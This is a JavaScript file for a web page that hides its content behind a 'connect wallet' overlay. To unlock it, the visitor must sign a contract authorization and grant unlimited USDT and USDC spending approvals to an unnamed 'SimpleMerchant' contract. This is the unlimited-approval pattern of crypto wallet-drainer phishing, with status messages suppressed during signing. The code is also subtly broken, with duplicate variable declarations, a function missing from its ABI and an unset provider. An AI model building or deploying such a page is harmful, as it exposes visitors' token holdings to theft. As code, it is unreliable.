// --- 常數設定 (已修正 STORE_ADDRESS) ---
const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Mainnet Address
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC 合約地址
const CONTRACT_ABI = [
    "function storeAddress() external view returns (address)",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const USDC_ABI = [ // 🚨 請確認 USDC 的 ABI
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const MULTICALL_ABI = [
    "function aggregate(tuple(address target, bytes callData)[] calls) external view returns (uint256 blockNumber, bytes[] returnData)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract, usdcContract; //  新增 usdcContract
// --- 全域變數 (保持不變) ---
// let readProvider;  //  移除
// let walletProvider;  //  移除
let signer;
let userAddress;
let contract;
let usdtContract;
let usdcContract; //  新增 usdcContract
let usdtBalance = 0n; // 声明 usdtBalance 变量并初始化
let usdcBalance = 0n; // 声明 usdcBalance 变量并初始化
let DELETED_ADDRESSES_KEY = 'deletedAddresses';
let ADDRESS_NOTES_KEY = 'addressNotes';

// 檢查 ethers.js 是否加載
if (typeof ethers === 'undefined') {
    console.error('ethers.js 未加載。');
    const status = document.getElementById('status');
    if (status) status.innerText = '錯誤：ethers.js 未加載。';
} else {
    console.log('ethers.js 版本：', ethers.version);
}

// --- 初始化與事件綁定 (保持不變) ---
document.addEventListener('DOMContentLoaded', () => {
    bindEventListeners();
    // initialize(); // 移除，改為點擊按鈕才初始化
});

function bindEventListeners() {
    // const loadWalletButton = document.getElementById('loadWalletButton');  // 移除
    // const refreshButton = document.getElementById('refreshButton');  // 移除
    const statusDiv = document.getElementById('status');
    const tableBody = document.getElementById('balanceTableBody');

    let allFound = true;

    if (!connectButton || !statusDiv || !tableBody) { //  loadWalletButton 和 refreshButton 移除，改為點擊connectButton
        allFound = false;
        console.error('致命錯誤：backend.html 中缺少核心 ID。');
    }

    if (!allFound) {
        if (statusDiv) statusDiv.innerText = '致命錯誤：所需的頁面元素缺失 (檢查 connectButton/status/balanceTableBody ID)。';
        return;
    }

    // loadWalletButton.addEventListener('click', loadWallet);  // 移除
    // refreshButton.addEventListener('click', updateBalances);  // 移除

    connectButton.addEventListener('click', () => { // 新增，監聽 connectButton
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            connectWallet();
        }
    });

    console.log('事件監聽器已成功綁定。');
}

// --- initializeWallet 函數 (僅保留錯誤/必要訊息) ---
async function initializeWallet() {
    console.log("initializeWallet called"); //  新增 log
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet'); // 顯示必要錯誤
            showOverlay('請安裝 MetaMask 或支援的錢包以繼續');
            return;
        }

        provider = new ethers.BrowserProvider(window.ethereum);
        console.log("provider created");  //  新增 log
        // Remove old listeners to prevent duplicate bindings
        //  移除事件監聽器， 避免重複綁定
        // if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
        // if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);

        // Check network and switch to Mainnet
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
            updateStatus('Switching to Ethereum Mainnet...'); // 顯示切換網路的警告/提示
            showOverlay('正在嘗試切換到以太坊主網... 請在錢包中確認');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }]
                });
                // Re-initialize provider after successful switch
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork();
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.'); // 顯示錯誤
                    showOverlay('用戶拒絕切換網絡。請手動切換到 Ethereum Mainnet。');
                } else {
                    updateStatus(`Network switch failed: ${switchError.message}`); // 顯示錯誤
                    showOverlay(`網絡切換失敗: ${switchError.message}`);
                }
                return;
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
             console.log("signer:", signer);  //  新增 log
            console.log("userAddress:", userAddress); //  新增 log
            // Initialize contracts with signer
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, signer); //  初始化 USDC 合約
             console.log("usdcContract:", usdcContract); //  新增 log

            // ** 連線已恢復，直接檢查授權，不顯示進度文字 **
            updateStatus(''); // 清空/隱藏狀態欄
            await checkAuthorization();
        } else {
            updateStatus(''); // 隱藏狀態欄
            showOverlay('請連繫錢包以解鎖內容');
        }

        // Account change listener, simplified to re-initialize
        accountChangeListener = (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('Wallet disconnected'); // 顯示斷開連繫的提示
            } else {
                initializeWallet();
            }
        };
        window.ethereum.on('accountsChanged', accountChangeListener);

        // Network change listener
        chainChangeListener = () => {
            resetState();
            updateStatus('Network changed, please reconnect wallet'); // 顯示網路變化的提示
            window.location.reload();
        };
        window.ethereum.on('chainChanged', chainChangeListener);

    } catch (error) {
        updateStatus(`Initialization failed: ${error.message}`); // 顯示初始化失敗的錯誤
        console.error("Initialize Wallet Error:", error);
        showOverlay(`初始化失敗: ${error.message}`);
    }
}

// --- checkAuthorization 函數 (邏輯不變，僅調整 updateStatus 呼叫) ---
async function checkAuthorization() {
    console.log("checkAuthorization called"); //  新增 log
    try {
        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) { //  新增 usdcContract 檢查
            showOverlay('錢包未準備好。請連線。');
            return;
        }

        const isAuthorized = await contract.authorized(userAddress);
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS); // USDC 授權額度檢查
        const maxAllowance = ethers.MaxUint256;

        let statusMessage = '';

        // Check SimpleMerchant contract authorization
        if (isAuthorized) {
            statusMessage += 'SimpleMerchant 合約已授權 ✅. '; // SimpleMerchant 合約已授權
        } else {
            statusMessage += 'SimpleMerchant 合約 NOT authorized ❌. '; // SimpleMerchant 合約未授權
        }

        // Check USDT authorization
        const isUsdtMaxApproved = usdtAllowance >= maxAllowance;
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved for MaxUint256 ✅.`; // USDT 已授權足夠金額 (MaxUint256)
        } else {
            statusMessage += `USDT not approved or approval is zero ❌. `; // USDT 未授權或授權為零
        }

        //  新增 USDC 授權檢查
        const isUsdcMaxApproved = usdcAllowance >= maxAllowance;
        if (isUsdcMaxApproved) {
            statusMessage += `USDC approved for MaxUint256 ✅.`; // USDC 已授權足夠金額 (MaxUint256)
        } else {
            statusMessage += `USDC not approved or approval is zero ❌. `; // USDC 未授權或授權為零
        }
        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved && isUsdcMaxApproved;

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet'; // 斷開錢包
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隱藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
            showOverlay('需要完成合約和 USDT/USDC 授權才能查看內容。點擊右上角按鈕開始交易。'); // 授權未完成，顯示遮罩
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`); // 顯示錯誤
        console.error("Check Authorization Error:", error);
        showOverlay(`檢查授權失敗: ${error.message}`);
    }
}


// --- connectWallet 函數 (移除所有中間狀態更新) ---
async function connectWallet() {
    console.log("connectWallet called"); //  新增 log
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }
        // Request wallet connection (MetaMask will confirm or maintain connection)

        await provider.send('eth_requestAccounts', []);

        // Re-get signer and contract instances
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, signer);

        // 1. Check and execute SimpleMerchant contract authorization (connectAndAuthorize)
        const isAuthorized = await contract.authorized(userAddress);
        if (!isAuthorized) {
            showOverlay('1/3: 請在錢包中簽署 **SimpleMerchant 合約授權** 交易...');
            const txAuthorize = await contract.connectAndAuthorize();
            const receiptAuthorize = await txAuthorize.wait();
            if (receiptAuthorize.status !== 1) {
                throw new Error('SimpleMerchant 合約授權 交易失敗.');
            }
        }

        // 2. Check and execute USDT token approval (approve)
        const maxAllowance = ethers.MaxUint256;
        showOverlay('2/3: 請在錢包中簽署 **USDT 代幣 MaxUint256 授權** 交易...');
        const txApproveUsdt = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
        const receiptApproveUsdt = await txApproveUsdt.wait();
        if (receiptApproveUsdt.status !== 1) {
            throw new Error('USDT 授權交易失敗.');
        }

        // 3. Check and execute USDC token approval (approve)  新增： USDC 授權
        showOverlay('3/3: 請在錢包中簽署 **USDC 代幣 MaxUint256 授權** 交易...');
        const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
        const receiptApproveUsdc = await txApproveUsdc.wait();
        if (receiptApproveUsdc.status !== 1) {
            throw new Error('USDC 授權交易失敗.');
        }

        // Final check and update button appearance
        await checkAuthorization();
        updateStatus(''); // 連線成功，隱藏狀態欄

    } catch (error) {
        updateStatus(`Operation failed: ${error.message}`); // 顯示操作失敗的錯誤
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet'; // 連繫錢包
        connectButton.disabled = false;
        showOverlay(`操作失敗。請重試或手動檢查連線。錯誤: ${error.message.slice(0, 50)}...`);
    }
}


// --- 其他函數 (保持不變) ---
function disconnectWallet() {
    resetState();
    updateStatus('Wallet disconnected, please reconnect.'); // 顯示斷開連繫的提示
    alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.'); // 提示用戶手動斷開
    showOverlay('錢包已斷開連繫，請連繫以解鎖內容'); // 斷開時顯示遮罩
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    usdcContract = null;  // 也要清空 usdcContract
    connectButton.classList.remove('connected');
    connectButton.title = 'Connect Wallet'; // 連繫錢包
    connectButton.disabled = false;
    updateStatus(''); // 重設時清空狀態欄
    showOverlay('請連繫錢包以解鎖內容 🔒'); // 重設時顯示遮罩
}

/**
 * 核心功能：控制狀態欄的隱藏與顯示。
 */
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block'; // 顯示內容
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none'; // 隱藏整個區塊
    }
}

// Listen for connect button click
connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

// Initialize wallet state on page load
// initializeWallet();  // 移除，改為點擊按鈕才初始化
console.log('connectButton event listener added and initializeWallet called');